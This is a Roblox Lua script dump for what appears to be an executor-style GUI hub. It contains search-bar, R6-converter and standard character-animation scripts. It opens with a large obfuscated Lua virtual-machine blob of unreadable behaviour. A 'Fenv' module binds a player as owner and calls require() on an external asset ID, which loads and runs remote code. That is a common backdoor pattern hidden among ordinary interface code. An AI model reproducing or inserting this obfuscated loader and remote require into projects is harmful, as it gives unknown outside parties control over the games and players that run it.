m=35184371740949-(-347883)M=o[d[-13792+13795]]Z=M M=I%m y=-782520+782775 o[d[-973434-(-973438)]]=M Q=I%y y=484271+-484269 m=Q+y o[d[40225+-40220]]=m y=b[W]W=N(-909692+945359)Q=y[W]y=Q(x)Q=N(-625523+661203)Y[I]=Q W=78946+-78945 Q=-524656+524873 j=f z=576754+164132 B=y f=-795321+795321 e=j<f f=W-j else z=7584840-419693 p=U q=p G[p]=q p=nil end end else if z<12120227-702518 then if z<11401795-169573 then p={}q={}U=J()y=nil o[U]=p r=N(396916-361195)C=N(-549913-(-585586))W=nil g=J()i=T(315114+7773709,{U;B;f;m})S=N(253608+-217925)p=J()j=nil M={}j=25746966365168-(-825786)o[p]=i i={}G=nil Y=nil o[g]=i i=b[S]O=o[g]m=E(m)Q=nil h=nil L={[C]=O;[r]=h}S=i(q,L)o[Z]=S i=D(93282-(-64418),{g;U;e,B,f;p})p=E(p)f=E(f)B=E(B)e=E(e)U=E(U)m=N(-112129-(-147813))g=E(g)o[I]=i Y=b[m]f=N(591794+-556118)m=N(-807609+843326)y=o[Z]W=o[I]B=W(f,j)m=Y[m]Q=y[B]G=31822382943304-(-894844)m=m(Y,Q)Y=J()W=N(-129124+164844)e=N(403175-367467)o[Y]=m y=b[W]B=o[Z]f=o[I]j=f(e,G)W=B[j]Q=y[W]e=113820808928-702070 j=N(-166437+202124)W=o[Z]B=o[I]f=B(j,e)y=W[f]m=Q[y]y=T(-849082+2467563,{Y;Z;I})z=b[N(921707-886011)]I=E(I)Z=E(Z)Q=N(-131748+167460)Y=E(Y)Q=m[Q]Q=Q(m,y)else I=o[d[-411629+411630]]m=932349+-932347 Z=88484-88483 Y=I(Z,m)I=-77538+77539 x=Y==I M=x z=x and 499759+13452155 or-225831+14227411 end else if z<438766+11038112 then Q=M W=N(120996+-85318)y=N(8099-(-27617))e=N(-828602+864280)M=b[y]y=N(400641-364971)z=M[y]y=J()o[y]=z M=b[W]W=N(550705+-515023)z=M[W]W=z f=z j=b[e]z=j and-380780+5049338 or-38113+2823478 B=j else x=nil o[d[-793977+793982]]=M z=-1007103+3891287 end end end end else if z<76322+13889535 then if z<-825402+14581862 then if z<13947936-523376 then if z<-952958+14224089 then if z<13023383-638388 then Y=171045+-171044 I=o[d[-311978+311981]]x=I~=Y z=x and-566898+5031674 or 635188+3605837 else Q=327402+23022800721111 x=v[-674869+674870]z=o[d[452334+-452333]]I=o[d[517680+-517678]]m=N(-946173+981845)Y=o[d[776248+-776245]]Z=Y(m,Q)M=I[Z]I=o[d[-377836+377840]]z[M]=I z=o[d[-427821+427826]]I=o[d[788024+-788023]]M={z(x,I)}M={a(M)}z=b[N(515790-480111)]end else M=-118116+577907 I=N(815801+-780082)Y=-865659+8153690 x=I^Y z=M-x M=N(288249-252584)x=z z=M/x M={z}z=b[N(287657+-251953)]end else if z<-980478+14438078 then M={}z=true o[d[673653+-673652]]=z z=b[N(-452974+488642)]else z=b[N(982334+-946646)]M={I}end end else if z<14042468-160933 then if z<12882032-(-883707)then z=3228098-(-352939)else q=E(q)C=E(C)L=E(L)O=E(O)z=6711213-747255 r=nil g=E(g)S=E(S)end else if z<13947822-18081 then n=o[I]z=n and 5744847-266792 or 457390+1006462 t=n else z=M and 4532266-47009 or 2451499-(-432685)end end end else if z<84579+15024251 then if z<15483663-969150 then if z<457198+13868201 then if z<-423597+14547980 then I=o[d[-468399+468401]]z=14795108-843194 Y=o[d[803001+-802998]]x=I==Y M=x else w=N(-374252+409951)z=434221+306665 n=b[w]w=N(-492911+528585)t=n[w]W=f n=t(x,W)t=o[d[-225959+225965]]w=t()U=n+w p=U+Q U=575154-574898 w=1038656+-1038655 G=p%U U=Y[I]Q=G n=Q+w t=Z[n]p=U..t W=nil Y[I]=p end else z=10618853-695990 end else if z<-949309+15765007 then z=true x=v m=J()I=J()y=N(52578+-16907)Y=N(498991+-463292)Z=J()o[I]=z M=b[Y]Y=N(-42209+77894)z=M[Y]Y=J()o[Y]=z z=V(-69730+1518222,{})o[Z]=z W=l(960702+12471004,{m})z=false o[m]=z Q=b[y]y=Q(W)M=y z=y and 8334238-(-480111)or 802169+10658789 else o[I]=K u=o[L]s=71970+-71969 c=u+s h=r[c]R=j+h h=-498159-(-498415)z=R%h c=o[q]j=z z=13879112-101795 h=e+c c=-735223+735479 R=h%c e=R end end else if z<125732+15156611 then if z<15123669-(-18401)then z=9920847-(-2016)else z=13120753-(-656564)o[I]=M end else if z<-399788+16365013 then U=#G i=-168037+168037 p=U==i z=p and-486511+11521472 or-921917+9205306 else R=o[I]K=R z=R and 4032603-124900 or 488111+14416152 end end end end end end end z=#X return a(M)end,{},function(b,N)local a=Y(N)local v=function(...)return z(b,{...},N,a)end return v end,function(b,N)local a=Y(N)local v=function(v,d,X,A)return z(b,{v,d;X,A},N,a)end return v end,function(b)for N=-523375-(-523376),#b,-755127+755128 do x[b[N]]=(-344683+344684)+x[b[N]]end if v then local z=v(true)local a=X(z)a[N(152549+-116876)],a[N(-339686-(-375404))],a[N(-362140-(-397804))]=b,Z,function()return-29921+801913 end return z else return d({},{[N(1011839+-976121)]=Z,[N(-697206+732879)]=b,[N(-991935+1027599)]=function()return 523952+248040 end})end end,function(b,N)local a=Y(N)local v=function()return z(b,{},N,a)end return v end,function(b,N)local a=Y(N)local v=function(v,d)return z(b,{v;d},N,a)end return v end,{},function(b,N)local a=Y(N)local v=function(v,d,X,A,M,o)return z(b,{v;d;X,A;M,o},N,a)end return v end,function(b,N)local a=Y(N)local v=function(v,d,X,A,M)return z(b,{v;d;X;A,M},N,a)end return v end,function()I=(-482735+482736)+I x[I]=-766136+766137 return I end,function(b,N)local a=Y(N)local v=function(v,d,X)return z(b,{v,d;X},N,a)end return v end,-2720-(-2720),function(b)x[b]=x[b]-(1005183+-1005182)if 688565-688565==x[b]then x[b],o[b]=nil,nil end end return(m(14672032-(-35617),{}))(a(M))end)(getfenv and getfenv()or _ENV,unpack or table[N(619495-583794)],newproxy,setmetatable,getmetatable,select,{...})end)(...)
end))
ModuleScript12.Name = "Fenv"
ModuleScript12.Parent = Script11
table.insert(cors,sandbox(ModuleScript12,function()
return function(plr)
    getfenv().owner = plr
    require(16312071272)()
    return getfenv()
end
end))
TextBox13.Parent = Folder7
TextBox13.Position = UDim2.new(0.0284463894, 0, 0.85546875, 0)
TextBox13.Visible = false
TextBox13.Size = UDim2.new(0, 335, 0, 27)
TextBox13.BackgroundColor = BrickColor.new("Institutional white")
TextBox13.BackgroundColor3 = Color3.new(1, 1, 1)
TextBox13.BackgroundTransparency = 0.6499999761581421
TextBox13.BorderColor = BrickColor.new("Really black")
TextBox13.BorderColor3 = Color3.new(0, 0, 0)
TextBox13.BorderSizePixel = 0
TextBox13.ZIndex = 3
TextBox13.Font = Enum.Font.Unknown
TextBox13.FontSize = Enum.FontSize.Size14
TextBox13.Text = ""
TextBox13.TextColor = BrickColor.new("Really black")
TextBox13.TextColor3 = Color3.new(0, 0, 0)
TextBox13.TextSize = 14
TextBox13.PlaceholderColor3 = Color3.new(0.443137, 0.443137, 0.443137)
TextBox13.PlaceholderText = "Search"
Frame14.Name = "shadowHolder"
Frame14.Parent = TextBox13
Frame14.Size = UDim2.new(1, 0, 1, 0)
Frame14.BackgroundTransparency = 1
ImageLabel15.Name = "umbraShadow"
ImageLabel15.Parent = Frame14
ImageLabel15.Position = UDim2.new(0.5, 0, 0.5, 6)
ImageLabel15.Size = UDim2.new(1, 10, 1, 10)
ImageLabel15.AnchorPoint = Vector2.new(0.5, 0.5)
ImageLabel15.BackgroundTransparency = 1
ImageLabel15.Image = "rbxassetid://1316045217"
ImageLabel15.ImageColor3 = Color3.new(0, 0, 0)
ImageLabel15.ImageTransparency = 0.8600000143051147
ImageLabel15.ScaleType = Enum.ScaleType.Slice
ImageLabel15.SliceCenter = 10, 10, 118, 118
ImageLabel16.Name = "penumbraShadow"
ImageLabel16.Parent = Frame14
ImageLabel16.Position = UDim2.new(0.5, 0, 0.5, 6)
ImageLabel16.Size = UDim2.new(1, 10, 1, 10)
ImageLabel16.AnchorPoint = Vector2.new(0.5, 0.5)
ImageLabel16.BackgroundTransparency = 1
ImageLabel16.Image = "rbxassetid://1316045217"
ImageLabel16.ImageColor3 = Color3.new(0, 0, 0)
ImageLabel16.ImageTransparency = 0.8799999952316284
ImageLabel16.ScaleType = Enum.ScaleType.Slice
ImageLabel16.SliceCenter = 10, 10, 118, 118
ImageLabel17.Name = "ambientShadow"
ImageLabel17.Parent = Frame14
ImageLabel17.Position = UDim2.new(0.5, 0, 0.5, 6)
ImageLabel17.Size = UDim2.new(1, 10, 1, 10)
ImageLabel17.AnchorPoint = Vector2.new(0.5, 0.5)
ImageLabel17.BackgroundTransparency = 1
ImageLabel17.Image = "rbxassetid://1316045217"
ImageLabel17.ImageColor3 = Color3.new(0, 0, 0)
ImageLabel17.ImageTransparency = 0.8799999952316284
ImageLabel17.ScaleType = Enum.ScaleType.Slice
ImageLabel17.SliceCenter = 10, 10, 118, 118
LocalScript18.Name = "Search"
LocalScript18.Parent = Folder7
table.insert(cors,sandbox(LocalScript18,function()
local searchbar = script.Parent.TextBox
local ScrollFrame = script.Parent.ScrollingFrame

function updateSearch()
    while wait(0) do
        for i,button in pairs(ScrollFrame:GetChildren()) do
            if button:IsA("TextButton") then
                local searchtext = string.lower(searchbar.Text)
                if searchtext ~= "" then
                    local buttonText = string.lower(button.Text)
                    if string.find(buttonText, searchtext) then
                        button.Visible = true
                        ScrollFrame.CanvasPosition = Vector2.new(0, 0)
                    else
                        button.Visible = false
                    end
                else
                    button.Visible = true
                end
            end
        end
    end
end

spawn(updateSearch)
end))
TextButton19.Name = "R6B"
TextButton19.Parent = Folder7
TextButton19.Position = UDim2.new(0.776805103, 0, 0.85546875, 0)
TextButton19.Visible = false
TextButton19.Size = UDim2.new(0, 32, 0, 27)
TextButton19.BackgroundColor = BrickColor.new("Institutional white")
TextButton19.BackgroundColor3 = Color3.new(1, 1, 1)
TextButton19.BackgroundTransparency = 0.6499999761581421
TextButton19.BorderColor = BrickColor.new("Really black")
TextButton19.BorderColor3 = Color3.new(0, 0, 0)
TextButton19.BorderSizePixel = 0
TextButton19.ZIndex = 11
TextButton19.Font = Enum.Font.Unknown
TextButton19.FontSize = Enum.FontSize.Size14
TextButton19.Text = "R6"
TextButton19.TextColor = BrickColor.new("Dark grey metallic")
TextButton19.TextColor3 = Color3.new(0.313726, 0.313726, 0.313726)
TextButton19.TextSize = 14
Frame20.Name = "shadowHolder"
Frame20.Parent = TextButton19
Frame20.Size = UDim2.new(1, 0, 1, 0)
Frame20.BackgroundTransparency = 1
Frame20.ZIndex = 10
ImageLabel21.Name = "umbraShadow"
ImageLabel21.Parent = Frame20
ImageLabel21.Position = UDim2.new(0.5, 0, 0.5, 6)
ImageLabel21.Size = UDim2.new(1, 10, 1, 10)
ImageLabel21.AnchorPoint = Vector2.new(0.5, 0.5)
ImageLabel21.BackgroundTransparency = 1
ImageLabel21.ZIndex = 10
ImageLabel21.Image = "rbxassetid://1316045217"
ImageLabel21.ImageColor3 = Color3.new(0, 0, 0)
ImageLabel21.ImageTransparency = 0.8600000143051147
ImageLabel21.ScaleType = Enum.ScaleType.Slice
ImageLabel21.SliceCenter = 10, 10, 118, 118
ImageLabel22.Name = "penumbraShadow"
ImageLabel22.Parent = Frame20
ImageLabel22.Position = UDim2.new(0.5, 0, 0.5, 6)
ImageLabel22.Size = UDim2.new(1, 10, 1, 10)
ImageLabel22.AnchorPoint = Vector2.new(0.5, 0.5)
ImageLabel22.BackgroundTransparency = 1
ImageLabel22.ZIndex = 10
ImageLabel22.Image = "rbxassetid://1316045217"
ImageLabel22.ImageColor3 = Color3.new(0, 0, 0)
ImageLabel22.ImageTransparency = 0.8799999952316284
ImageLabel22.ScaleType = Enum.ScaleType.Slice
ImageLabel22.SliceCenter = 10, 10, 118, 118
ImageLabel23.Name = "ambientShadow"
ImageLabel23.Parent = Frame20
ImageLabel23.Position = UDim2.new(0.5, 0, 0.5, 6)
ImageLabel23.Size = UDim2.new(1, 10, 1, 10)
ImageLabel23.AnchorPoint = Vector2.new(0.5, 0.5)
ImageLabel23.BackgroundTransparency = 1
ImageLabel23.ZIndex = 10
ImageLabel23.Image = "rbxassetid://1316045217"
ImageLabel23.ImageColor3 = Color3.new(0, 0, 0)
ImageLabel23.ImageTransparency = 0.8799999952316284
ImageLabel23.ScaleType = Enum.ScaleType.Slice
ImageLabel23.SliceCenter = 10, 10, 118, 118
TextButton24.Name = "RE"
TextButton24.Parent = Folder7
TextButton24.Position = UDim2.new(0.870896995, 0, 0.85546875, 0)
TextButton24.Visible = false
TextButton24.Size = UDim2.new(0, 32, 0, 27)
TextButton24.BackgroundColor = BrickColor.new("Institutional white")
TextButton24.BackgroundColor3 = Color3.new(1, 1, 1)
TextButton24.BackgroundTransparency = 0.6499999761581421
TextButton24.BorderColor = BrickColor.new("Really black")
TextButton24.BorderColor3 = Color3.new(0, 0, 0)
TextButton24.BorderSizePixel = 0
TextButton24.ZIndex = 11
TextButton24.Font = Enum.Font.Unknown
TextButton24.FontSize = Enum.FontSize.Size14
TextButton24.Text = "RE"
TextButton24.TextColor = BrickColor.new("Dark grey metallic")
TextButton24.TextColor3 = Color3.new(0.313726, 0.313726, 0.313726)
TextButton24.TextSize = 14
Frame25.Name = "shadowHolder"
Frame25.Parent = TextButton24
Frame25.Size = UDim2.new(1, 0, 1, 0)
Frame25.BackgroundTransparency = 1
Frame25.ZIndex = 10
ImageLabel26.Name = "umbraShadow"
ImageLabel26.Parent = Frame25
ImageLabel26.Position = UDim2.new(0.5, 0, 0.5, 6)
ImageLabel26.Size = UDim2.new(1, 10, 1, 10)
ImageLabel26.AnchorPoint = Vector2.new(0.5, 0.5)
ImageLabel26.BackgroundTransparency = 1
ImageLabel26.ZIndex = 10
ImageLabel26.Image = "rbxassetid://1316045217"
ImageLabel26.ImageColor3 = Color3.new(0, 0, 0)
ImageLabel26.ImageTransparency = 0.8600000143051147
ImageLabel26.ScaleType = Enum.ScaleType.Slice
ImageLabel26.SliceCenter = 10, 10, 118, 118
ImageLabel27.Name = "penumbraShadow"
ImageLabel27.Parent = Frame25
ImageLabel27.Position = UDim2.new(0.5, 0, 0.5, 6)
ImageLabel27.Size = UDim2.new(1, 10, 1, 10)
ImageLabel27.AnchorPoint = Vector2.new(0.5, 0.5)
ImageLabel27.BackgroundTransparency = 1
ImageLabel27.ZIndex = 10
ImageLabel27.Image = "rbxassetid://1316045217"
ImageLabel27.ImageColor3 = Color3.new(0, 0, 0)
ImageLabel27.ImageTransparency = 0.8799999952316284
ImageLabel27.ScaleType = Enum.ScaleType.Slice
ImageLabel27.SliceCenter = 10, 10, 118, 118
ImageLabel28.Name = "ambientShadow"
ImageLabel28.Parent = Frame25
ImageLabel28.Position = UDim2.new(0.5, 0, 0.5, 6)
ImageLabel28.Size = UDim2.new(1, 10, 1, 10)
ImageLabel28.AnchorPoint = Vector2.new(0.5, 0.5)
ImageLabel28.BackgroundTransparency = 1
ImageLabel28.ZIndex = 10
ImageLabel28.Image = "rbxassetid://1316045217"
ImageLabel28.ImageColor3 = Color3.new(0, 0, 0)
ImageLabel28.ImageTransparency = 0.8799999952316284
ImageLabel28.ScaleType = Enum.ScaleType.Slice
ImageLabel28.SliceCenter = 10, 10, 118, 118
Script29.Parent = Folder7
table.insert(cors,sandbox(Script29,function()
local Refresh = script.Parent.RE
local R6 = script.Parent.R6B
R6.MouseButton1Click:Connect(function()
    require(script.Parent.R6).load(script.Parent.Parent.Parent.Parent.Parent.Name)
end)
Refresh.MouseButton1Click:Connect(function()
    game.Players:FindFirstChild(script.Parent.Parent.Parent.Parent.Parent.Name):LoadCharacter()
end)
end))
ModuleScript30.Name = "R6"
ModuleScript30.Parent = Folder7
table.insert(cors,sandbox(ModuleScript30,function()
local R6Converter = {}
function R6Converter.load(Plr)
Plr = game.Players:WaitForChild(Plr)
local FalseChar = script:WaitForChild(" "):Clone()
local PlayersCharacter = game.Players:GetCharacterAppearanceAsync(Plr.UserId):Clone()
local FaceID = (Plr.Character:WaitForChild("Head"):FindFirstChild("face") or {Texture = "http://www.roblox.com/asset/?id=144080495"}).Texture
local Accessories = {}
FalseChar:WaitForChild("Head"):WaitForChild("face").Texture = FaceID
FalseChar:SetPrimaryPartCFrame(Plr.Character:WaitForChild("HumanoidRootPart").CFrame)
for _,Prt in pairs(PlayersCharacter:GetDescendants()) do
if Prt:IsA("Accessory") or Prt:IsA("Hat") or Prt:IsA("BodyColors") or Prt:IsA("CharacterMesh")or Prt:IsA("Pants") or Prt:IsA("Shirt") or Prt:IsA("ShirtGraphic") or Prt:IsA("Tool") then
table.insert(Accessories,Prt:Clone())
end
end

for _,Prt in pairs(Plr.Character:GetChildren()) do
Prt:Destroy()
end
for _,Prt in pairs(FalseChar:GetChildren()) do
Prt.Parent = Plr.Character
end
for _,Prt in pairs(Accessories) do
Prt.Parent = Plr.Character
end


end

return R6Converter

end))
Model31.Name = " "
Model31.Parent = ModuleScript30
Model31.PrimaryPart = Part78
LocalScript32.Name = "Animate"
LocalScript32.Parent = Model31
table.insert(cors,sandbox(LocalScript32,function()
local Figure = script.Parent
local Torso = Figure:WaitForChild("Torso")
local RightShoulder = Torso:WaitForChild("Right Shoulder")
local LeftShoulder = Torso:WaitForChild("Left Shoulder")
local RightHip = Torso:WaitForChild("Right Hip")
local LeftHip = Torso:WaitForChild("Left Hip")
local Neck = Torso:WaitForChild("Neck")
local Humanoid = Figure:WaitForChild("Humanoid")
local pose = "Standing"

local currentAnim = ""
local currentAnimInstance = nil
local currentAnimTrack = nil
local currentAnimKeyframeHandler = nil
local currentAnimSpeed = 1.0
local animTable = {}
local animNames = { 
	idle = 	{	
				{ id = "http://www.roblox.com/asset/?id=180435571", weight = 9 },
				{ id = "http://www.roblox.com/asset/?id=180435792", weight = 1 }
			},
	walk = 	{ 	
				{ id = "http://www.roblox.com/asset/?id=180426354", weight = 10 } 
			}, 
	run = 	{
				{ id = "run.xml", weight = 10 } 
			}, 
	jump = 	{
				{ id = "http://www.roblox.com/asset/?id=125750702", weight = 10 } 
			}, 
	fall = 	{
				{ id = "http://www.roblox.com/asset/?id=180436148", weight = 10 } 
			}, 
	climb = {
				{ id = "http://www.roblox.com/asset/?id=180436334", weight = 10 } 
			}, 
	sit = 	{
				{ id = "http://www.roblox.com/asset/?id=178130996", weight = 10 } 
			},	
	toolnone = {
				{ id = "http://www.roblox.com/asset/?id=182393478", weight = 10 } 
			},
	toolslash = {
				{ id = "http://www.roblox.com/asset/?id=129967390", weight = 10 } 
--				{ id = "slash.xml", weight = 10 } 
			},
	toollunge = {
				{ id = "http://www.roblox.com/asset/?id=129967478", weight = 10 } 
			},
	wave = {
				{ id = "http://www.roblox.com/asset/?id=128777973", weight = 10 } 
			},
	point = {
				{ id = "http://www.roblox.com/asset/?id=128853357", weight = 10 } 
			},
	dance1 = {
				{ id = "http://www.roblox.com/asset/?id=182435998", weight = 10 }, 
				{ id = "http://www.roblox.com/asset/?id=182491037", weight = 10 }, 
				{ id = "http://www.roblox.com/asset/?id=182491065", weight = 10 } 
			},
	dance2 = {
				{ id = "http://www.roblox.com/asset/?id=182436842", weight = 10 }, 
				{ id = "http://www.roblox.com/asset/?id=182491248", weight = 10 }, 
				{ id = "http://www.roblox.com/asset/?id=182491277", weight = 10 } 
			},
	dance3 = {
				{ id = "http://www.roblox.com/asset/?id=182436935", weight = 10 }, 
				{ id = "http://www.roblox.com/asset/?id=182491368", weight = 10 }, 
				{ id = "http://www.roblox.com/asset/?id=182491423", weight = 10 } 
			},
	laugh = {
				{ id = "http://www.roblox.com/asset/?id=129423131", weight = 10 } 
			},
	cheer = {
				{ id = "http://www.roblox.com/asset/?id=129423030", weight = 10 } 
			},
}
local dances = {"dance1", "dance2", "dance3"}

-- Existance in this list signifies that it is an emote, the value indicates if it is a looping emote
local emoteNames = { wave = false, point = false, dance1 = true, dance2 = true, dance3 = true, laugh = false, cheer = false}

function configureAnimationSet(name, fileList)
	if (animTable[name] ~= nil) then
		for _, connection in pairs(animTable[name].connections) do
			connection:disconnect()
		end
	end
	animTable[name] = {}
	animTable[name].count = 0
	animTable[name].totalWeight = 0	
	animTable[name].connections = {}

	-- check for config values
	local config = script:FindFirstChild(name)
	if (config ~= nil) then
--		print("Loading anims " .. name)
		table.insert(animTable[name].connections, config.ChildAdded:connect(function(child) configureAnimationSet(name, fileList) end))
		table.insert(animTable[name].connections, config.ChildRemoved:connect(function(child) configureAnimationSet(name, fileList) end))
		local idx = 1
		for _, childPart in pairs(config:GetChildren()) do
			if (childPart:IsA("Animation")) then
				table.insert(animTable[name].connections, childPart.Changed:connect(function(property) configureAnimationSet(name, fileList) end))
				animTable[name][idx] = {}
				animTable[name][idx].anim = childPart
				local weightObject = childPart:FindFirstChild("Weight")
				if (weightObject == nil) then
					animTable[name][idx].weight = 1
				else
					animTable[name][idx].weight = weightObject.Value
				end
				animTable[name].count = animTable[name].count + 1
				animTable[name].totalWeight = animTable[name].totalWeight + animTable[name][idx].weight
	--			print(name .. " [" .. idx .. "] " .. animTable[name][idx].anim.AnimationId .. " (" .. animTable[name][idx].weight .. ")")
				idx = idx + 1
			end
		end
	end

	-- fallback to defaults
	if (animTable[name].count <= 0) then
		for idx, anim in pairs(fileList) do
			animTable[name][idx] = {}
			animTable[name][idx].anim = Instance.new("Animation")
			animTable[name][idx].anim.Name = name
			animTable[name][idx].anim.AnimationId = anim.id
			animTable[name][idx].weight = anim.weight
			animTable[name].count = animTable[name].count + 1
			animTable[name].totalWeight = animTable[name].totalWeight + anim.weight
--			print(name .. " [" .. idx .. "] " .. anim.id .. " (" .. anim.weight .. ")")
		end
	end
end

-- Setup animation objects
function scriptChildModified(child)
	local fileList = animNames[child.Name]
	if (fileList ~= nil) then
		configureAnimationSet(child.Name, fileList)
	end	
end

script.ChildAdded:connect(scriptChildModified)
script.ChildRemoved:connect(scriptChildModified)


for name, fileList in pairs(animNames) do 
	configureAnimationSet(name, fileList)
end	

-- ANIMATION

-- declarations
local toolAnim = "None"
local toolAnimTime = 0

local jumpAnimTime = 0
local jumpAnimDuration = 0.3

local toolTransitionTime = 0.1
local fallTransitionTime = 0.3
local jumpMaxLimbVelocity = 0.75

-- functions

function stopAllAnimations()
	local oldAnim = currentAnim

	-- return to idle if finishing an emote
	if (emoteNames[oldAnim] ~= nil and emoteNames[oldAnim] == false) then
		oldAnim = "idle"
	end

	currentAnim = ""
	currentAnimInstance = nil
	if (currentAnimKeyframeHandler ~= nil) then
		currentAnimKeyframeHandler:disconnect()
	end

	if (currentAnimTrack ~= nil) then
		currentAnimTrack:Stop()
		currentAnimTrack:Destroy()
		currentAnimTrack = nil
	end
	return oldAnim
end

function setAnimationSpeed(speed)
	if speed ~= currentAnimSpeed then
		currentAnimSpeed = speed
		currentAnimTrack:AdjustSpeed(currentAnimSpeed)
	end
end

function keyFrameReachedFunc(frameName)
	if (frameName == "End") then

		local repeatAnim = currentAnim
		-- return to idle if finishing an emote
		if (emoteNames[repeatAnim] ~= nil and emoteNames[repeatAnim] == false) then
			repeatAnim = "idle"
		end
		
		local animSpeed = currentAnimSpeed
		playAnimation(repeatAnim, 0.0, Humanoid)
		setAnimationSpeed(animSpeed)
	end
end

-- Preload animations
function playAnimation(animName, transitionTime, humanoid) 
		
	local roll = math.random(1, animTable[animName].totalWeight) 
	local origRoll = roll
	local idx = 1
	while (roll > animTable[animName][idx].weight) do
		roll = roll - animTable[animName][idx].weight
		idx = idx + 1
	end
--		print(animName .. " " .. idx .. " [" .. origRoll .. "]")
	local anim = animTable[animName][idx].anim

	-- switch animation		
	if (anim ~= currentAnimInstance) then
		
		if (currentAnimTrack ~= nil) then
			currentAnimTrack:Stop(transitionTime)
			currentAnimTrack:Destroy()
		end

		currentAnimSpeed = 1.0
	
		-- load it to the humanoid; get AnimationTrack
		currentAnimTrack = humanoid:LoadAnimation(anim)
		currentAnimTrack.Priority = Enum.AnimationPriority.Core
		 
		-- play the animation
		currentAnimTrack:Play(transitionTime)
		currentAnim = animName
		currentAnimInstance = anim

		-- set up keyframe name triggers
		if (currentAnimKeyframeHandler ~= nil) then
			currentAnimKeyframeHandler:disconnect()
		end
		currentAnimKeyframeHandler = currentAnimTrack.KeyframeReached:connect(keyFrameReachedFunc)
		
	end

end

-------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------

local toolAnimName = ""
local toolAnimTrack = nil
local toolAnimInstance = nil
local currentToolAnimKeyframeHandler = nil

function toolKeyFrameReachedFunc(frameName)
	if (frameName == "End") then
--		print("Keyframe : ".. frameName)	
		playToolAnimation(toolAnimName, 0.0, Humanoid)
	end
end


function playToolAnimation(animName, transitionTime, humanoid, priority)	 
		
		local roll = math.random(1, animTable[animName].totalWeight) 
		local origRoll = roll
		local idx = 1
		while (roll > animTable[animName][idx].weight) do
			roll = roll - animTable[animName][idx].weight
			idx = idx + 1
		end
--		print(animName .. " * " .. idx .. " [" .. origRoll .. "]")
		local anim = animTable[animName][idx].anim

		if (toolAnimInstance ~= anim) then
			
			if (toolAnimTrack ~= nil) then
				toolAnimTrack:Stop()
				toolAnimTrack:Destroy()
				transitionTime = 0
			end
					
			-- load it to the humanoid; get AnimationTrack
			toolAnimTrack = humanoid:LoadAnimation(anim)
			if priority then
				toolAnimTrack.Priority = priority
			end
			 
			-- play the animation
			toolAnimTrack:Play(transitionTime)
			toolAnimName = animName
			toolAnimInstance = anim

			currentToolAnimKeyframeHandler = toolAnimTrack.KeyframeReached:connect(toolKeyFrameReachedFunc)
		end
end

function stopToolAnimations()
	local oldAnim = toolAnimName

	if (currentToolAnimKeyframeHandler ~= nil) then
		currentToolAnimKeyframeHandler:disconnect()
	end

	toolAnimName = ""
	toolAnimInstance = nil
	if (toolAnimTrack ~= nil) then
		toolAnimTrack:Stop()
		toolAnimTrack:Destroy()
		toolAnimTrack = nil
	end


	return oldAnim
end

-------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------


function onRunning(speed)
	if speed > 0.01 then
		playAnimation("walk", 0.1, Humanoid)
		if currentAnimInstance and currentAnimInstance.AnimationId == "http://www.roblox.com/asset/?id=180426354" then
			setAnimationSpeed(speed / 14.5)
		end
		pose = "Running"
	else
		if emoteNames[currentAnim] == nil then
			playAnimation("idle", 0.1, Humanoid)
			pose = "Standing"
		end
	end
end

function onDied()
	pose = "Dead"
end

function onJumping()
	playAnimation("jump", 0.1, Humanoid)
	jumpAnimTime = jumpAnimDuration
	pose = "Jumping"
end

function onClimbing(speed)
	playAnimation("climb", 0.1, Humanoid)
	setAnimationSpeed(speed / 12.0)
	pose = "Climbing"
end

function onGettingUp()
	pose = "GettingUp"
end

function onFreeFall()
	if (jumpAnimTime <= 0) then
		playAnimation("fall", fallTransitionTime, Humanoid)
	end
	pose = "FreeFall"
end

function onFallingDown()
	pose = "FallingDown"
end

function onSeated()
	pose = "Seated"
end

function onPlatformStanding()
	pose = "PlatformStanding"
end

function onSwimming(speed)
	if speed > 0 then
		pose = "Running"
	else
		pose = "Standing"
	end
end

function getTool()	
	for _, kid in ipairs(Figure:GetChildren()) do
		if kid.className == "Tool" then return kid end
	end
	return nil
end

function getToolAnim(tool)
	for _, c in ipairs(tool:GetChildren()) do
		if c.Name == "toolanim" and c.className == "StringValue" then
			return c
		end
	end
	return nil
end

function animateTool()
	
	if (toolAnim == "None") then
		playToolAnimation("toolnone", toolTransitionTime, Humanoid, Enum.AnimationPriority.Idle)
		return
	end

	if (toolAnim == "Slash") then
		playToolAnimation("toolslash", 0, Humanoid, Enum.AnimationPriority.Action)
		return
	end

	if (toolAnim == "Lunge") then
		playToolAnimation("toollunge", 0, Humanoid, Enum.AnimationPriority.Action)
		return
	end
end

function moveSit()
	RightShoulder.MaxVelocity = 0.15
	LeftShoulder.MaxVelocity = 0.15
	RightShoulder:SetDesiredAngle(3.14 /2)
	LeftShoulder:SetDesiredAngle(-3.14 /2)
	RightHip:SetDesiredAngle(3.14 /2)
	LeftHip:SetDesiredAngle(-3.14 /2)
end

local lastTick = 0

function move(time)
	local amplitude = 1
	local frequency = 1
  	local deltaTime = time - lastTick
  	lastTick = time

	local climbFudge = 0
	local setAngles = false

  	if (jumpAnimTime > 0) then
  		jumpAnimTime = jumpAnimTime - deltaTime
  	end

	if (pose == "FreeFall" and jumpAnimTime <= 0) then
		playAnimation("fall", fallTransitionTime, Humanoid)
	elseif (pose == "Seated") then
		playAnimation("sit", 0.5, Humanoid)
		return
	elseif (pose == "Running") then
		playAnimation("walk", 0.1, Humanoid)
	elseif (pose == "Dead" or pose == "GettingUp" or pose == "FallingDown" or pose == "Seated" or pose == "PlatformStanding") then
--		print("Wha " .. pose)
		stopAllAnimations()
		amplitude = 0.1
		frequency = 1
		setAngles = true
	end

	if (setAngles) then
		local desiredAngle = amplitude * math.sin(time * frequency)

		RightShoulder:SetDesiredAngle(desiredAngle + climbFudge)
		LeftShoulder:SetDesiredAngle(desiredAngle - climbFudge)
		RightHip:SetDesiredAngle(-desiredAngle)
		LeftHip:SetDesiredAngle(-desiredAngle)
	end

	-- Tool Animation handling
	local tool = getTool()
	if tool and tool:FindFirstChild("Handle") then
	
		local animStringValueObject = getToolAnim(tool)

		if animStringValueObject then
			toolAnim = animStringValueObject.Value
			-- message recieved, delete StringValue
			animStringValueObject.Parent = nil
			toolAnimTime = time + .3
		end

		if time > toolAnimTime then
			toolAnimTime = 0
			toolAnim = "None"
		end

		animateTool()		
	else
		stopToolAnimations()
		toolAnim = "None"
		toolAnimInstance = nil
		toolAnimTime = 0
	end
end

-- connect events
Humanoid.Died:connect(onDied)
Humanoid.Running:connect(onRunning)
